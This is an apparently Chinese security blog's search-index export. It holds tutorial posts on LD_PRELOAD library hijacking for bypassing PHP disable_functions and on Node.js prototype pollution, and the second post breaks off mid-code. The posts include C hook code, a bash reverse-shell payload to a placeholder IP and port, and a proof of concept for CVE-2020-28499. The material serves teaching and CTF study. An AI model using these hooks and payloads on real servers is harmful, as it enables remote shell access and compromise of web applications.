<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>劫持LD_PRELOAD</title>
    <link href="/2023/01/12/%E5%8A%AB%E6%8C%81LD_PRELOAD/"/>
    <url>/2023/01/12/%E5%8A%AB%E6%8C%81LD_PRELOAD/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>LD_PRELOAD是Linux系统中的一个环境变量，作用是在程序在运行链接之前优先加载LD_PRELOAD中的链接库，因此通过指定LD_PRELOAD变量我们可以实现二进制程序的链接库劫持，覆盖重写原来的系统调用。</p><h2 id="0x01-劫持系统命令"><a href="#0x01-劫持系统命令" class="headerlink" title="0x01 劫持系统命令"></a>0x01 劫持系统命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> LD_PRELOAD=&lt;path_to_so&gt;   <span class="hljs-comment">#设置</span><br><span class="hljs-comment">#或者可以执行时指定，好处是仅作用于本次命令</span><br><span class="hljs-comment">#LD_PRELOAD=$PWD/hook_ls.so ls</span><br><span class="hljs-built_in">unset</span> LD_PRELOAD    <span class="hljs-comment">#解除</span><br></code></pre></td></tr></table></figure><p>以ls命令为例使用<code>readelf -Ws /usr/bin/ls</code>查看ls命令调用的库函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">Num:    Value          Size Type    Bind   Vis      Ndx Name<br>     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND <br>     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __ctype_toupper_loc@GLIBC_2.3 (2)<br>     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getenv@GLIBC_2.2.5 (3)<br>     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND cap_to_text<br>     4: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND __progname@GLIBC_2.2.5 (3)<br>     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND sigprocmask@GLIBC_2.2.5 (3)<br>     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __snprintf_chk@GLIBC_2.3.4 (4)<br>     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND raise@GLIBC_2.2.5 (3)<br>     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND free@GLIBC_2.2.5 (3)<br>     9: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND abort@GLIBC_2.2.5 (3)<br>    10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __errno_location@GLIBC_2.2.5 (3)<br>    11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strncmp@GLIBC_2.2.5 (3)<br>    12: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterTMCloneTable<br>    13: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND stdout@GLIBC_2.2.5 (3)<br> . . . . . . . <br></code></pre></td></tr></table></figure><p>选择strncmp进行劫持，重新定义strncmp的函数体，注意<strong>参数列表必须保持不变</strong>，记得unsetenv。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//hook_ls.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">payload</span><span class="hljs-params">()</span> &#123;<br>    system(<span class="hljs-string">&quot;echo Hijacked!&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">strncmp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__s1, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__s2, <span class="hljs-type">size_t</span> __n)</span> &#123;    <br>    <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    payload();<br>&#125;<br></code></pre></td></tr></table></figure><p>然后编译并设置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -shared -fPIC hook_ls.c -o hook_ls.so<br><span class="hljs-built_in">export</span> LD_PRELOAD=<span class="hljs-variable">$PWD</span>/hook_ls.so<br></code></pre></td></tr></table></figure><p>最后执行ls</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[spring@VM codes]$ <span class="hljs-built_in">export</span> LD_PRELOAD=<span class="hljs-variable">$PWD</span>/hook_ls.so<br>[spring@VM codes]$ <span class="hljs-built_in">ls</span><br>Hijacked!<br>hook_ls.c  hook_ls.so<br></code></pre></td></tr></table></figure><h2 id="0x02-绕过-Disable-Functions"><a href="#0x02-绕过-Disable-Functions" class="headerlink" title="0x02 绕过 Disable_Functions"></a>0x02 绕过 Disable_Functions</h2><p>在拿到php环境下的webshell时常常遇到Disable_Functions禁用系统命令执行的情况，使用LD_PRELOAD也可以实现bypass。</p><p>根据上述LD_PRELOAD劫持的特点，欲将其用于bypass Disable_Functions需要满足以下几个条件：</p><ul><li>由于LD_PRELOAD是在程序链接之前起作用，因此我们无法在现有php进程中实现劫持，<strong>必须要寻找能够创建新进程的函数</strong>。</li><li><strong>环境变量需要可控</strong>，例如可以使用putenv()函数。</li></ul><h3 id="mail"><a href="#mail" class="headerlink" title="mail()"></a>mail()</h3><p>mail()函数是php内置用于发送邮件的函数，在底层是调用Linux中的sendmail函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//mail.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&quot;a@localhost&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>执行并使用strace跟踪系统调用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strace -f php mail.php 2&gt;&amp;1 &#124; grep -A2 -B2 execve<br></code></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[spring@VM codes]$ strace -f php mail.php 2&gt;&amp;1 &#124; grep -A2 -B2 execve<br>execve(<span class="hljs-string">&quot;/usr/local/lighthouse/softwares/php/bin/php&quot;</span>, [<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;mail.php&quot;</span>], 0x7ffefe042d70 /* 30 vars */) = 0<br>brk(NULL)                               = 0x1e22000<br>arch_prctl(0x3001 /* ARCH_??? */, 0x7ffd432847b0) = -1 EINVAL (无效的参数)<br>--<br>[pid 2432766] fcntl(4, F_SETFD, 0)      = 0<br>[pid 2432767] dup2(3, 0)                = 0<br>[pid 2432767] execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, [<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;/usr/sbin/sendmail -t -i &quot;</span>], 0x1e22d90 /* 30 vars */ &lt;unfinished ...&gt;<br>[pid 2432766] fstat(4,  &lt;unfinished ...&gt;<br>[pid 2432767] &lt;... execve resumed&gt;)     = 0<br>[pid 2432766] &lt;... fstat resumed&gt;&#123;st_mode=S_IFIFO&#124;0600, st_size=0, ...&#125;) = 0<br>[pid 2432767] brk(NULL)                 = 0x55a7a0633000<br>--<br>[pid 2432767] rt_sigaction(SIGQUIT, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f5dd9a87790&#125;, &#123;sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f5dd9a87790&#125;, 8) = 0<br>[pid 2432767] rt_sigaction(SIGCHLD, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER&#124;SA_RESTART, sa_restorer=0x7f5dd9a87790&#125;, &#123;sa_handler=0x55a79e54a180, sa_mask=[], sa_flags=SA_RESTORER&#124;SA_RESTART, sa_restorer=0x7f5dd9a87790&#125;, 8) = 0<br>[pid 2432767] execve(<span class="hljs-string">&quot;/usr/sbin/sendmail&quot;</span>, [<span class="hljs-string">&quot;/usr/sbin/sendmail&quot;</span>, <span class="hljs-string">&quot;-t&quot;</span>, <span class="hljs-string">&quot;-i&quot;</span>], 0x55a7a0641c30 /* 30 vars */) = -1 ENOENT (没有那个文件或目录)<br>[pid 2432767] <span class="hljs-built_in">stat</span>(<span class="hljs-string">&quot;/usr/sbin/sendmail&quot;</span>, 0x7ffc517fd470) = -1 ENOENT <br>[pid 2432767] <span class="hljs-built_in">stat</span>(<span class="hljs-string">&quot;/usr/sbin/sendmail&quot;</span>, 0x7ffc517fd450) = -1 ENOENT <br></code></pre></td></tr></table></figure><p>明显是调用了<code>/usr/sbin/sendmail</code>，同时execve启用了新进程，因此劫持sendmail()即可劫持mail()。</p><p>下一步查看sendmail()的库函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">readelf -Ws /usr/sbin/sendmail<br></code></pre></td></tr></table></figure><p>(我的vps里没有sendmail拓展，不过问题不大后续可以解决这个问题)</p><p>挑选getuid函数进行劫持：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//hook_getuid.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">payload</span><span class="hljs-params">()</span> &#123;<br>    system(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;port&gt; 0&gt;&amp;1&#x27;&quot;</span>);<br>&#125;<br><br><span class="hljs-type">uid_t</span> <span class="hljs-title function_">getuid</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    payload();<br>&#125;<br><span class="hljs-comment">//最后编译生成 gcc -shared -fPIC hook_getuid.c -o hook_getuid.so</span><br></code></pre></td></tr></table></figure><p>然后在脚本中设置环境变量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;LD_PRELOAD=/var/tmp/hook_getuid.so&quot;</span>);    <span class="hljs-comment">// 注意这里的目录要有访问权限</span><br><span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&quot;test@localhost&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>执行即可实现劫持。</p><h3 id="error-log"><a href="#error-log" class="headerlink" title="error_log()"></a>error_log()</h3><p>error_log()和mail()一样也会调用sendmail，劫持的过程没有差别不再赘述</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;LD_PRELOAD=/var/tmp/hook_getuid.so&quot;</span>);    <span class="hljs-comment">// 注意这里的目录要有访问权限</span><br><span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>能创建新进程的函数含有很多，有时候要根据主机所安装的拓展因地制宜。</p><h2 id="0x03-attribute-constructor"><a href="#0x03-attribute-constructor" class="headerlink" title="0x03  __attribute__((constructor))"></a>0x03  __attribute__((constructor))</h2><p>上面提到在我的vps中没有sendmail拓展，因此事实上我们无法实现劫持，因此我们需要一个通用的解决方案，那就是C语言的一个拓展修饰符<code>__attribute__((constructor))</code>，由它所修饰的函数将在程序main()函数之前执行，如果它存在于动态链接库中，那么它将会在动态链接库被系统加载之前执行。这样就可以实现对于链接的劫持，而不是局限于特定的系统调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//同样去劫持ls</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br>__attribute__ ((__constructor__)) <span class="hljs-type">void</span> <span class="hljs-title function_">preload</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    system(<span class="hljs-string">&quot;echo Hijacked!&quot;</span>);<br>&#125;<br><span class="hljs-comment">//编译执行 gcc -shared -fPIC hook_ls.c -o hook_ls.so</span><br></code></pre></td></tr></table></figure><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://www.anquanke.com/post/id/254388">https://www.anquanke.com/post/id/254388</a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>LD_PRELOAD</tag>
      
      <tag>hijack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux系统编程</title>
    <link href="/2023/01/01/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/"/>
    <url>/2023/01/01/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>nodejs原型链污染</title>
    <link href="/2022/12/30/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <url>/2022/12/30/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-原型链与原型链继承"><a href="#0x00-原型链与原型链继承" class="headerlink" title="0x00 原型链与原型链继承"></a>0x00 原型链与原型链继承</h2><h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p>原型链污染(<strong>prototype pollution</strong>)是js独有的安全问题，其原因主要是因为js中几乎所有类的所有属性都可以公开访问和修改，通过修改多个可控变量去覆盖<code>__proto__</code>属性即可污染其它类，即如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。</p><p>原型链污染发生的两个场景是：</p><ul><li><strong>不安全的对象递归合并</strong></li><li><strong>按路径定义属性</strong>。</li></ul><p>在js中每个实例对象object都有个原型对象，原型对象又有对应的原型对象，以此类推可构成<strong>原型链</strong>，层层向上知道第一个原型对象为null。</p><p>要访问一个实例对象的原型对象，有以下方式：</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">objectname</span>.[[proto<span class="hljs-keyword">type</span>]]<br><span class="hljs-title">objectname</span>.proto<span class="hljs-keyword">type</span><br><span class="hljs-title">objectname</span>[<span class="hljs-string">&quot;__proto__&quot;</span>]<br><span class="hljs-title">objectname</span>.__proto__<br><span class="hljs-title">objectname</span>.constructor.proto<span class="hljs-keyword">type</span><br></code></pre></td></tr></table></figure><p>在定义类构造函数的时候，有一个预定义属性<code>prototype</code>，他就是一个原型对象。在实例化对象的时候会生成一个属性<code>__proto__</code>，它所指向的便是这个对象构造函数的prototype，例如</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Class1</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">var</span> = <span class="hljs-literal">null</span><br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Class2</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">var</span> = <span class="hljs-literal">null</span><br>&#125;<br><br><span class="hljs-comment">//将Class2的原型指向Class1</span><br><span class="hljs-title class_">Class2</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Class1</span><br><span class="hljs-keyword">let</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class2</span>()<br><br><span class="hljs-comment">//打印Class1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;obj.__proto__&#125;</span>`</span>)<br></code></pre></td></tr></table></figure><h3 id="原型链继承"><a href="#原型链继承" class="headerlink" title="原型链继承"></a>原型链继承</h3><p>类在实例化的时候会拥有类自身<code>prototype</code>中的属性和方法，即<code>object</code>会继承其<code>__proto__</code>属性指向的原型对象的属性和方法，例如</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Father</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">last_name</span> = <span class="hljs-string">&quot;time&quot;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Son</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&quot;spring&quot;</span><br>&#125;<br><br><span class="hljs-title class_">Son</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Father</span>();<br><span class="hljs-keyword">let</span> son = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>();<br><span class="hljs-comment">//打印Name:spring time</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Name:<span class="hljs-subst">$&#123;son.first_name&#125;</span> <span class="hljs-subst">$&#123;son.last_name&#125;</span>`</span>)<br><br></code></pre></td></tr></table></figure><p>在输出last_name时，由于Son中没有此属性，于是到其原型对象<code>son.__proto__</code>，也就是Father实例中寻找，如果依然没找到，那么就继续到<code>son.__proto__.__proto__</code>寻找，直到找到为止，未找到返回<code>undefined</code>。</p><p>至此总结出几个要点：</p><ul><li>每个构造函数(<code>constructor</code>)都有一个原型对象(<code>prototype</code>)</li><li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li><li>JavaScript使用<code>prototype</code>链实现继承机制</li></ul><h2 id="0x01-原型链污染"><a href="#0x01-原型链污染" class="headerlink" title="0x01 原型链污染"></a>0x01 原型链污染</h2><p>首先是json语法的一些规则：</p><ul><li>数据在名称&#x2F;值对中</li><li>数据由逗号分隔</li><li>花括号容纳对象</li><li>方括号容纳数组</li></ul><p>JSON键&#x2F;值对由<strong>键和值</strong>组成，<strong>键必须是字符串</strong>，值可以是字符串（string）、数值(number) 、对象（object）、数组（array）、true、false、null。</p><p>例如</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> object = &#123;<br>  <span class="hljs-string">&#x27;a&#x27;</span>: [&#123; <span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-number">2</span> &#125;, &#123; <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-number">4</span> &#125;]<br>&#125;;<br></code></pre></td></tr></table></figure><p>首先看一个语句</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">object[a][b] = value<br></code></pre></td></tr></table></figure><p>如果我们能同时控制a、b、value的值，将a设置为<code>__proto__</code>，那么就可以给object的原型ProtoClass设置一个值为value的属性b，即使原型中没有b属性也可以添加进去，与此同时所有原型链中含有ProtoClass的对象也将增加属性b，这就是<strong>原型链污染</strong>。</p><h2 id="0x02-merge引发的污染"><a href="#0x02-merge引发的污染" class="headerlink" title="0x02 merge引发的污染"></a>0x02 merge引发的污染</h2><h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>一个简单的例子</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>merge函数对数组的键名进行了递归合并操作，注意<code>target[key] = source[key]</code>，如果我们能控制键名<code>source</code>为<code>__proto__</code>，同时利用target为其赋值，就可以为source的原型对象添加属性实现污染。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)<br><span class="hljs-title function_">merge</span>(o1, o2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)<br><br>o3 = &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)<br><br><span class="hljs-comment">//输出</span><br><span class="hljs-comment">//1 2</span><br><span class="hljs-comment">//2</span><br></code></pre></td></tr></table></figure><p>可见o3被成功污染，实际上由于o1、o2、o3原型类统一，它们都会拥有属性b。</p><p>注意如果令b等于<code>&#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>，那么对b的键名进行遍历的时候就会忽略<code>__proto__</code>不会把它看作键名，因为<code>__proto__</code>被看作是原型了，所以遍历后的键名是a、b。</p><p>因此为了使<code>__proto__</code>被解析为键名，我们需要配合JSON.parse。</p><h3 id="merge-recursiveMerge"><a href="#merge-recursiveMerge" class="headerlink" title="merge.recursiveMerge"></a>merge.recursiveMerge</h3><p>漏洞编号CVE-2020-28499，poc如下，需要引入<a href="mailto:&#x6d;&#101;&#114;&#x67;&#101;&#x40;&#x32;&#x2e;&#49;&#46;&#48;">&#x6d;&#101;&#114;&#x67;&#101;&#x40;&#x32;&#x2e;&#49;&#46;&#48;</a>(ver&lt;2.1.1)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> merge = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;merge&#x27;</span>);<br><br><span class="hljs-keyword">const</span> payload2 = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;&#123;&quot;x&quot;: &#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;:&quot;yes&quot;&#125;&#125;&#125;&#x27;</span>);<br><br><span class="hljs-keyword">let</span> obj1 = &#123;<span class="hljs-attr">x</span>: &#123;<span class="hljs-attr">y</span>:<span class="hljs-number">1</span>&#125;&#125;;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Before : &quot;</span> + obj1.<span class="hljs-property">polluted</span>);<br>merge.<span class="hljs-title function_">recursive</span>(obj1, payload2);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;After : &quot;</span> + obj1.<span class="hljs-property">polluted</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;After : &quot;</span> + &#123;&#125;.<span class="hljs-property">polluted</span>);<br><br><span class="hljs-comment">//输出</span><br><span class="hljs-comment">//Before : undefined</span><br><span class="hljs-comment">//After : yes</span><br><span class="hljs-comment">//After : yes</span><br></code></pre></td></tr></table></figure><p>调试过程中发现调用链是<code>recursive -&gt; _merge -&gt; _recursiveMerge</code>，而<code>_recursiveMerge</code>中存在递归合并:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span 